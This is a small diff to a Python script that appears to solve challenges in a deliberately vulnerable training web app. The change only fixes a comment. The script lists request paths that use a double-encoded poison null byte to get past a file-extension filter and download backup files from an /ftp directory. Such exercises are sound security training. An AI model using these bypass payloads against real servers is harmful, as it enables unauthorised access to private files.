@@ -31,7 +31,7 @@ if __name__ == '__main__':
     urls = [
         '/ftp/coupons_2013.md.bak%25%30%30.md', # Forgotten Sales Backup
         '/ftp/suspicious_errors.yml%25%30%30.md', # Misplaced Signature File
-        '/ftp/package.json.bak%25%30%30.md', Forgotten Developer Backup & Poison Null Byte
+        '/ftp/package.json.bak%25%30%30.md', # Forgotten Developer Backup & Poison Null Byte
         '/ftp/eastere.gg%25%30%30.md', # Easter Egg
         '/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg' # Nested Easter Egg
     ]
